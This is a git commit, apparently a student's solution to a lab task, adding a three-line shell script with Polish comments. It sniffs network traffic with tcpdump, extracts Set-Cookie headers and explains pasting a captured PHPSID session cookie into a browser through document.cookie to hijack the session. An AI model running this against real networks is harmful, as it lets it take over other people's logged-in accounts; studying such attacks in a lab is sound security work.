fe812839f8559223a9946af525ab439d9c321731
angrystudent <lewoallg01@o2.pl>
2016-01-11 02:28:47 +0100

    skrypt do zadania 2

---
+++ skrypt.sh
@@ -0,0 +1,3 @@
+sudo tcpdump -l -A | grep Set-Cookie:
+# wyswietla ciasteczka ( w ktoryms z ciastek jest PHPSID, kopiujemy jego zawartosc )
+# a pozniej z poziomu konsoli przegladarki wklejamy do ciastka document.cookie="wklej skopiowana zawartosc"
